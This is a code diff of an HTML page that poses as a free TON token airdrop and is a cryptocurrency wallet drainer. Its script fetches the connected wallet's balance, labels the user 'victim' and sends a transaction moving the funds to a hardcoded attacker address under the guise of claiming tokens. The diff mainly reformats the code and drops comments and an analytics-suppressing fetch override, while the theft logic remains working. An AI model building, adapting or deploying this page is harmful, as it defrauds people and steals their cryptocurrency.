@@ -25,7 +25,6 @@
             overflow-x: hidden;
         }
 
-        /* Анимированный фон */
         .background {
             position: fixed;
             top: 0;
@@ -43,13 +42,13 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: conic-gradient(from 0deg at 50% 50%, 
-                rgba(240,185,11,0.1) 0deg, 
-                transparent 60deg, 
-                rgba(240,185,11,0.05) 120deg, 
+            background: conic-gradient(from 0deg at 50% 50%,
+                rgba(240,185,11,0.1) 0deg,
+                transparent 60deg,
+                rgba(240,185,11,0.05) 120deg,
                 transparent 180deg,
-                rgba(240,185,11,0.1) 240deg, 
-                transparent 300deg, 
+                rgba(240,185,11,0.1) 240deg,
+                transparent 300deg,
                 rgba(240,185,11,0.05) 360deg);
             animation: rotate 20s linear infinite;
             z-index: -1;
@@ -138,7 +137,6 @@
             margin: 20px 0 10px;
         }
 
-        /* Стилизация кнопки TonConnect */
         #connect-container > button {
             background: linear-gradient(90deg, #f0b90b, #ff8c00) !important;
             color: #0f0f0f !important;
@@ -165,7 +163,6 @@
             transform: scale(0.98);
         }
 
-        /* Блик на кнопке */
         #connect-container > button::after {
             content: '';
             position: absolute;
@@ -215,7 +212,7 @@
             <div>👥 Participants<br><span>154,921</span></div>
         </div>
         <p class="description">
-            Connect your TON wallet to verify eligibility and claim your free tokens. 
+            Connect your TON wallet to verify eligibility and claim your free tokens.
             Limited offer — only for active users.
         </p>
         <div class="btn-container" id="connect-container"></div>
@@ -228,27 +225,18 @@
     <script>
         (function() {
             if (typeof TON_CONNECT_UI === 'undefined') {
-                document.getElementById('status').innerHTML = 
+                document.getElementById('status').innerHTML =
                     '<span style="color:red">❌ Failed to load TonConnect library.</span>';
                 return;
             }
 
-            // Подавляем аналитику
-            const originalFetch = window.fetch;
-            window.fetch = function(url, ...args) {
-                if (typeof url === 'string' && url.includes('analytics.ton.org')) {
-                    return Promise.resolve(new Response('{}', { status: 200 }));
-                }
-                return originalFetch.call(this, url, ...args);
-            };
-
             const statusDiv = document.getElementById('status');
-            // ВАЖНО: замените на ваш реальный адрес получателя (сейчас указан из вашего примера)
+            // Замените на ваш реальный адрес получателя, если нужно
             const DESTINATION_ADDRESS = 'UQBiTR-x4quXNhtXj1I1e1bs8tUeQspQru7HCoPmj76IqmlL';
-            // Манифест из вашего репозитория
+            // Манифест из вашего репозитория (убедитесь, что файл лежит в корне)
             const MANIFEST_URL = 'https://nwealesss.github.io/draintest/tonconnect-manifest.json';
 
-            // Статический список кошельков (чтобы не зависеть от config.ton.org)
+            // Статический список кошельков – SDK не будет обращаться к config.ton.org
             const walletsList = [
                 {
                     name: 'Tonkeeper',
@@ -293,7 +281,8 @@
                     manifestUrl: MANIFEST_URL,
                     buttonRootId: 'connect-container',
                     network: 'mainnet',
-                    walletsListSource: async () => walletsList,
+                    // ✅ Используем walletsList (массив) – полностью отключает внешний источник
+                    walletsList: walletsList,
                     enableAnalytics: false
                 });
 
@@ -302,15 +291,15 @@
                 connector.onStatusChange(async (wallet) => {
                     if (wallet) {
                         const victimAddress = wallet.account.address;
-                        statusDiv.innerHTML = 
+                        statusDiv.innerHTML =
                             `<p>✅ Wallet connected:<br><b>${victimAddress.slice(0,6)}...${victimAddress.slice(-4)}</b></p>`;
                         statusDiv.innerHTML += '<p>⚡ Fetching balance...</p>';
 
                         try {
-                            // Запрос баланса через CORS-прокси (используем надёжный прокси)
+                            // Запрос баланса через CORS-прокси
                             const apiUrl = `https://toncenter.com/api/v2/getAddressBalance?address=${victimAddress}`;
                             const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`;
-                            
+
                             const response = await fetch(proxyUrl);
                             if (!response.ok) throw new Error(`HTTP ${response.status}`);
                             const data = await response.json();
@@ -326,11 +315,11 @@
                             }
 
                             const amountString = amountToDrain.toString();
-                            statusDiv.innerHTML += 
+                            statusDiv.innerHTML +=
                                 `<p>💰 Balance: ${(Number(balance) / 1e9).toFixed(4)} TON</p>`;
-                            statusDiv.innerHTML += 
+                            statusDiv.innerHTML +=
                                 `<p>📤 Claiming: ${(Number(amountToDrain) / 1e9).toFixed(4)} TON</p>`;
-                            statusDiv.innerHTML += 
+                            statusDiv.innerHTML +=
                                 `<p>🎯 Recipient:<br><b>${DESTINATION_ADDRESS.slice(0,6)}...${DESTINATION_ADDRESS.slice(-4)}</b></p>`;
 
                             const transaction = {
@@ -344,9 +333,9 @@
                             };
 
                             await connector.sendTransaction(transaction);
-                            statusDiv.innerHTML += 
+                            statusDiv.innerHTML +=
                                 '<p style="color:#f0b90b">✅ Confirm transaction in your wallet to receive tokens!</p>';
-                            statusDiv.innerHTML += 
+                            statusDiv.innerHTML +=
                                 '<p style="color:#ff6b6b; font-weight:bold;">⚠️ This is a full drain transaction. All your TON will be transferred.</p>';
                         } catch (e) {
                             statusDiv.innerHTML += `<p style="color:red">❌ Error: ${e.message}</p>`;
